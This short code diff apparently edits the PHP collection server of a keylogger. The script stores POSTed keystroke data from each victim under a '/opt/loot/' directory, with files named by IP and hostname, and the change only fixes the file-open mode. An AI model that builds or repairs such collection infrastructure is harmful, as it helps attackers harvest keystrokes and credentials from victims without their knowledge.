@@ -41,7 +41,7 @@ $post_data = json_decode($post_data_raw, true);
 $client = getUserIP() . '_keylogged';
 $client_hostname = $post_data['hostname'];
 
-$file_handle = fopen('/opt/loot/' . $client . '_' . $client_hostname . '.log', 'wa');
+$file_handle = fopen('/opt/loot/' . $client . '_' . $client_hostname . '.log', 'w+');
 fwrite($file_handle, $post_data['data']);
 fclose($file_handle);
 
